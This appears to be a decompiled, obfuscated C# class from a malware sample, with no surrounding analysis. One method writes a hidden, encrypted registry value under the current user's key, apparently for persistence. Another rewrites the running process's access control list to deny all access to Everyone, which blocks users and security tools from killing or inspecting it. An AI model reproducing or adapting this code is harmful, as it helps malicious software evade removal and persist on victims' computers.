using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace cmxGDwJsHiH;

internal sealed class utunjQFNHhMFoTtd
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr ZTJipUTGKlpi, int nvpMoWinjLeJs, [Out] byte[] jyRQsWqABFnqd, uint IIRrjyPIaoLtUQc, out uint sMxoqNxhrIt);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr vGoLRHZPsBcTF, int WjGDfHFzSGUay, [In] byte[] NcYsWlOQdNK);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void uBuKtAEeAhzYa(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107409975)));
			registryKey.SetValue(GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107409870)), getString_0(107410063));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor EcpioSeFFklOJ(IntPtr intptr_0)
	{
		byte[] jyRQsWqABFnqd = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, jyRQsWqABFnqd, 0u, out var sMxoqNxhrIt);
		if ((long)sMxoqNxhrIt > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, jyRQsWqABFnqd = new byte[sMxoqNxhrIt], sMxoqNxhrIt, out sMxoqNxhrIt))
		{
			return null;
		}
		return new RawSecurityDescriptor(jyRQsWqABFnqd, 0);
	}

	private void FZQyALfnOcy(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void SmgmhjqfKtA()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = EcpioSeFFklOJ(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			FZQyALfnOcy(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static utunjQFNHhMFoTtd()
	{
		Strings.CreateGetStringDelegate(typeof(utunjQFNHhMFoTtd));
	}
}
